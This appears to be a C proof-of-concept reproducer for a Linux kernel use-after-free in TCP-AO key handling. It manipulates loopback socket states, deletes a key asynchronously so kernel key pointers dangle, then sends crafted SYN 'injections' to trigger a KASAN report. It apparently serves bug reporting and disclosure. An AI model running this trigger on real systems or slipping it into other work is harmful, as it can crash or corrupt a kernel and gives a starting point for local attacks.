// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#ifndef TCP_AO_ADD_KEY
#define TCP_AO_ADD_KEY		38
#endif
#ifndef TCP_AO_DEL_KEY
#define TCP_AO_DEL_KEY		39
#endif
#ifndef TCP_AO_INFO
#define TCP_AO_INFO		40
#endif
#define AO_MAXKEYLEN		80

struct k_sockaddr_storage {
	unsigned short	ss_family;
	char		__data[126];
} __attribute__((aligned(8)));

struct ao_add {
	struct k_sockaddr_storage addr;
	char		alg_name[64];
	int		ifindex;
	unsigned int	flags;
	unsigned short	reserved2;
	unsigned char	prefix;
	unsigned char	sndid;
	unsigned char	rcvid;
	unsigned char	maclen;
	unsigned char	keyflags;
	unsigned char	keylen;
	unsigned char	key[AO_MAXKEYLEN];
} __attribute__((aligned(8)));

struct ao_del {
	struct k_sockaddr_storage addr;
	int		ifindex;
	unsigned int	flags;
	unsigned short	reserved2;
	unsigned char	prefix;
	unsigned char	sndid;
	unsigned char	rcvid;
	unsigned char	current_key;
	unsigned char	rnext;
	unsigned char	keyflags;
} __attribute__((aligned(8)));

#define PORT_S		20101
#define AO_ALG		"cmac(aes128)"
static const unsigned char AO_PASS[16] = "0123456789abcdef";

#define ST_ESTABLISHED	1
#define ST_FIN_WAIT2	5
#define ST_CLOSE	7
#define ST_LISTEN	10

static int sk_state(int fd)
{
	struct tcp_info ti;
	socklen_t l = sizeof(ti);

	memset(&ti, 0, sizeof(ti));
	if (getsockopt(fd, IPPROTO_TCP, TCP_INFO, &ti, &l) < 0)
		return -1;
	return ti.tcpi_state;
}

static int ao_add_key(int fd, unsigned char sndid, unsigned char rcvid,
		      int set_current, int set_rnext)
{
	struct ao_add cmd;
	struct sockaddr_in *sin = (struct sockaddr_in *)&cmd.addr;

	memset(&cmd, 0, sizeof(cmd));
	sin->sin_family = AF_INET;
	sin->sin_port = 0;
	sin->sin_addr.s_addr = inet_addr("127.0.0.1");
	strcpy(cmd.alg_name, AO_ALG);
	cmd.prefix = 32;
	cmd.sndid = sndid;
	cmd.rcvid = rcvid;
	cmd.maclen = 12;
	cmd.keylen = sizeof(AO_PASS);
	memcpy(cmd.key, AO_PASS, sizeof(AO_PASS));
	cmd.flags = (set_current ? 1u : 0u) | (set_rnext ? 2u : 0u);

	return setsockopt(fd, IPPROTO_TCP, TCP_AO_ADD_KEY, &cmd, sizeof(cmd));
}

static int ao_del_async(int fd, unsigned char sndid, unsigned char rcvid)
{
	struct ao_del cmd;
	struct sockaddr_in *sin = (struct sockaddr_in *)&cmd.addr;

	memset(&cmd, 0, sizeof(cmd));
	sin->sin_family = AF_INET;
	sin->sin_port = 0;
	sin->sin_addr.s_addr = inet_addr("127.0.0.1");
	cmd.prefix = 32;
	cmd.sndid = sndid;
	cmd.rcvid = rcvid;
	cmd.flags = 4u;

	return setsockopt(fd, IPPROTO_TCP, TCP_AO_DEL_KEY, &cmd, sizeof(cmd));
}

static void dump_proc_net_tcp(const char *tag)
{
	char buf[8192];
	int fd, n;

	fd = open("/proc/net/tcp", O_RDONLY);
	if (fd < 0)
		return;
	n = read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (n <= 0)
		return;
	buf[n] = 0;
	printf("[*] /proc/net/tcp (%s):\n%s\n", tag, buf);
	fflush(stdout);
}

static void set_reuse(int fd)
{
	int one = 1;

	setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
	setsockopt(fd, SOL_SOCKET, SO_REUSEPORT, &one, sizeof(one));
}

int main(void)
{
	struct sockaddr_in sa, cli_sa;
	socklen_t slen;
	int srv, cli, acc, inj;
	unsigned short cli_port;
	int i, rc;

	setvbuf(stdout, NULL, _IONBF, 0);
	printf("[*] sizeof(ao_add)=%zu sizeof(ao_del)=%zu\n",
	       sizeof(struct ao_add), sizeof(struct ao_del));

	srv = socket(AF_INET, SOCK_STREAM, 0);
	if (srv < 0) { perror("socket srv"); return 1; }
	set_reuse(srv);

	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(PORT_S);
	sa.sin_addr.s_addr = inet_addr("127.0.0.1");
	if (bind(srv, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		perror("bind srv"); return 1;
	}

	if (ao_add_key(srv, 100, 100, 0, 0) < 0) {
		printf("[-] TCP_AO_ADD_KEY on server failed: %s\n", strerror(errno));
		return 1;
	}
	if (listen(srv, 8) < 0) { perror("listen srv"); return 1; }
	printf("[+] server listening on 127.0.0.1:%d with AO key (100,100)\n", PORT_S);

	cli = socket(AF_INET, SOCK_STREAM, 0);
	if (cli < 0) { perror("socket cli"); return 1; }
	set_reuse(cli);

	if (ao_add_key(cli, 100, 100, 1, 1) < 0) {
		printf("[-] add K1 failed: %s\n", strerror(errno));
		return 1;
	}
	if (ao_add_key(cli, 200, 200, 0, 0) < 0) {
		printf("[-] add K2 failed: %s\n", strerror(errno));
		return 1;
	}
	printf("[+] client keys K1(100,100)=current/rnext, K2(200,200) added\n");

	if (connect(cli, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		printf("[-] connect failed: %s\n", strerror(errno));
		return 1;
	}
	slen = sizeof(cli_sa);
	if (getsockname(cli, (struct sockaddr *)&cli_sa, &slen) < 0) {
		perror("getsockname"); return 1;
	}
	cli_port = ntohs(cli_sa.sin_port);
	printf("[+] AO connection established, client port %u (state %d)\n",
	       cli_port, sk_state(cli));

	acc = accept(srv, NULL, NULL);
	if (acc < 0) { perror("accept"); return 1; }
	printf("[+] accepted on server side\n");

	if (shutdown(cli, SHUT_WR) < 0) { perror("shutdown"); return 1; }
	usleep(200 * 1000);
	printf("[*] after shutdown(SHUT_WR): client state %d (expect %d FIN_WAIT2)\n",
	       sk_state(cli), ST_FIN_WAIT2);

	close(acc);
	usleep(400 * 1000);

	rc = sk_state(cli);
	printf("[*] after peer FIN: client state %d (expect %d TCP_CLOSE)\n",
	       rc, ST_CLOSE);
	if (rc != ST_CLOSE) {
		printf("[-] socket did not take the FIN_WAIT2 -> TIME_WAIT path\n");
		return 1;
	}
	dump_proc_net_tcp("after TIME_WAIT transition");
	printf("[+] tcp_ao_info is now shared: TIME_WAIT sock + live fd %d\n", cli);

	{
		struct sockaddr unspec;

		memset(&unspec, 0, sizeof(unspec));
		unspec.sa_family = AF_UNSPEC;
		if (connect(cli, &unspec, sizeof(unspec)) < 0) {
			printf("[-] connect(AF_UNSPEC) failed: %s\n", strerror(errno));
			return 1;
		}
	}
	if (listen(cli, 1) < 0) {
		printf("[-] listen() on the shared socket failed: %s\n",
		       strerror(errno));
		return 1;
	}
	printf("[+] shared socket is now TCP_LISTEN (state %d)\n", sk_state(cli));

	if (ao_del_async(cli, 100, 100) < 0) {
		printf("[-] TCP_AO_DEL_KEY(del_async) failed: %s\n", strerror(errno));
		return 1;
	}
	printf("[+] K1 unlinked + call_rcu()'d; TIME_WAIT ao_info->{current,rnext}_key dangle\n");

	close(cli);
	close(srv);

	for (i = 0; i < 20; i++)
		usleep(50 * 1000);
	printf("[*] RCU grace period elapsed, key freed\n");
	dump_proc_net_tcp("before injection");

	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(cli_port);
	sa.sin_addr.s_addr = inet_addr("127.0.0.1");

	for (i = 0; i < 6; i++) {
		struct sockaddr_in src;

		inj = socket(AF_INET, SOCK_STREAM, 0);
		if (inj < 0) { perror("socket inj"); break; }
		set_reuse(inj);
		memset(&src, 0, sizeof(src));
		src.sin_family = AF_INET;
		src.sin_port = htons(PORT_S);
		src.sin_addr.s_addr = inet_addr("127.0.0.1");
		if (bind(inj, (struct sockaddr *)&src, sizeof(src)) < 0) {
			printf("[-] bind inj: %s\n", strerror(errno));
			close(inj);
			usleep(200 * 1000);
			continue;
		}

		if (ao_add_key(inj, 200, 200, 1, 1) < 0) {
			printf("[-] add inj key: %s\n", strerror(errno));
			close(inj);
			break;
		}
		fcntl(inj, F_SETFL, O_NONBLOCK);
		printf("[*] injection %d: SYN 127.0.0.1:%d -> 127.0.0.1:%u "
		       "(AO rnext_keyid=200)\n", i, PORT_S, cli_port);
		connect(inj, (struct sockaddr *)&sa, sizeof(sa));
		usleep(700 * 1000);
		close(inj);
		usleep(300 * 1000);
	}

	printf("[*] done — check dmesg for the KASAN report\n");
	sleep(2);
	return 0;
}
